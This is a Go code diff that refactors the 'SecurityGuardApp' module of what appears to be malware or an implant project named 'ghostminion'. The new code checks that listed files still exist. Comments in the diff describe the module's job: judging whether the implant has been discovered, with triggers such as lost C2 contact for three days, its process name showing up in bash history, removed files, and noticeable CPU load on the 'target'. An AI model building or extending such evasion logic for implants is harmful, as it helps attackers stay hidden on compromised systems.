@@ -3,34 +3,33 @@ package apps
 import (
 	"errors"
 	"fmt"
-	"ghostminion/config"
+	"log"
 	"os"
 	"sync"
-	"time"
 )
 
 type SecurityGuardApp struct {
-	isSafe bool
-	mu     sync.Mutex
+	isSafe         bool
+	mu             sync.Mutex
+	FilesExistence []string
 }
 
-func (c *SecurityGuardApp) IsSafeToRun() bool {
-	c.mu.Lock()
-	defer c.mu.Unlock()
-	return c.isSafe
+func (ctx *SecurityGuardApp) IsSafe() bool {
+	ctx.mu.Lock()
+	defer ctx.mu.Unlock()
+	return ctx.isSafe
 }
 
-var stopSecurityGuardApp = false
+func (ctx *SecurityGuardApp) SetIsSafe(isSafe bool) {
+	ctx.mu.Lock()
+	ctx.isSafe = isSafe
+	ctx.mu.Unlock()
+}
 
-func (c *SecurityGuardApp) Start(wg *sync.WaitGroup) {
-	configInstance, _ := config.GetConfig()
+func (ctx *SecurityGuardApp) Start(wg *sync.WaitGroup) {
 	defer wg.Done()
 	fmt.Println("Starting SecurityGuard app.")
-	time.Sleep(2 * time.Hour)
-	c.mu.Lock()
-	c.isSafe = false
-	c.mu.Unlock()
-	allFilesInPlace(configInstance)
+	ctx.checkFileExistence(ctx.FilesExistence)
 	/*
 		isSafe should be false on one of these terms
 		- it has been too much time without communicating with the C2 (3 days)
@@ -38,31 +37,24 @@ func (c *SecurityGuardApp) Start(wg *sync.WaitGroup) {
 		- someone wrote the process name in its bash history
 		- any of the files that was supposed to be in its place is not anymore
 		- the cpu of the target has increase too much because of our process
-
-		if the
 	*/
 }
 
-func (c *SecurityGuardApp) Stop() error {
-	stopSecurityGuardApp = true
+func (ctx *SecurityGuardApp) Stop() error {
 	return nil
 }
 
-func (c *SecurityGuardApp) Validate() error {
-	c.isSafe = true
+func (ctx *SecurityGuardApp) Validate() error {
+	ctx.isSafe = true
 	return nil
 }
 
-func allFilesInPlace(configInstance *config.Config) bool {
-	if _, err := os.Stat(configInstance.Installation.ConfigFile); errors.Is(err, os.ErrNotExist) {
-		return false
+func (ctx *SecurityGuardApp) checkFileExistence(files []string) {
+	for _, file := range files {
+		if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
+			log.Printf("File %s does not exist.", file)
+			ctx.SetIsSafe(false)
+			break
+		}
 	}
-	if _, err := os.Stat(configInstance.Installation.DBPath); errors.Is(err, os.ErrNotExist) {
-		return false
-	}
-	return true
-}
-
-func DidSomeoneSearchMe(configInstance *config.Config) bool {
-	return false
 }
